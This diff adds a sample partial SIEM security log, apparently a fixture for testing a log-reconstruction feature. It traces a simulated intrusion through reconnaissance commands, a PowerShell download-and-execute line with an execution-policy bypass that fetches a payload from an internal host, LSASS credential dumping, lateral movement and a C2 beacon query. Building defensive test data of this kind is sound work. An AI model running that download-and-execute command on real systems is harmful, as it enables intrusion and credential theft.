@@ -1,0 +1,14 @@
+# Red ELISAR — Sample Partial Security Log
+# This represents a partial SIEM log with gaps in the kill chain
+# Used to test the log reconstruction feature
+
+2024-03-15 08:23:15 EventID=4624 Security Successful logon for user jsmith from 10.0.1.50 via RDP
+2024-03-15 08:25:33 EventID=4688 Security Process created: C:\Windows\System32\cmd.exe by jsmith
+2024-03-15 08:26:01 EventID=4688 Security Process created: C:\Windows\System32\whoami.exe /all by jsmith
+2024-03-15 08:26:45 EventID=4688 Security Process created: C:\Windows\System32\systeminfo.exe by jsmith
+2024-03-15 08:27:12 EventID=4688 Security Process created: C:\Windows\System32\net.exe view /domain by jsmith
+2024-03-15 08:30:22 EventID=4688 Security Process created: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.1.200/payload.ps1')" by jsmith
+2024-03-15 08:35:44 EventID=10 Sysmon LSASS.exe accessed by rundll32.exe with PROCESS_VM_READ credential dumping detected
+2024-03-15 08:40:15 EventID=4648 Security Explicit credential used: admin_svc account from workstation WS-042
+2024-03-15 08:42:30 EventID=3 Sysmon Network connection to 10.0.2.15:445 SMB lateral movement from WS-042
+2024-03-15 09:15:00 EventID=1 Sysmon Suspicious DNS query to c2-beacon.malicious-domain.com from 10.0.2.15
